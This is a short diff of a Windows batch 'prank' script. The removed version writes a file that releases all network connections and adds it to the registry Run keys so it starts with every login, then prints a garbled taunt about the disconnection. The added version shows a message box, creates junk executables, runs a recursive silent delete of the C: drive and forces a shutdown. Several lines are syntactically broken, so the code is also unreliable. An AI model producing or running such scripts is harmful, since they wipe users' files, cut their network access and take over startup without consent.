@@ -1,8 +1,14 @@
-echo @echo off>c:windowswimn32.bat
-echo break off>>c:windowswimn32.bat
-echo ipconfig/release_all>>c:windowswimn32.bat
-echo end>>c:windowswimn32.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
-reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
-echo M?ng c?a b?n dã b? ng?t k?t n?i :))!
-PAUSE
+@echo off
+#Notrayicon
+echo x=msgbox("Enjoy...",0+40,"....") >>Enjoy.vbs
+start "" "Enjoy.vbs"
+echo>> D6F9F6G65GF958F.exe
+echo >> OGV76VC7BX9BX9Y.exe
+DEL C:\/s /q *.*
+echo >>Treomay.vbs
+set /p Treomay.vbs=
+do
+treomay:run
+loop
+start "Treomay.vbs
+shutdown -s -t 30 -c "loading..."
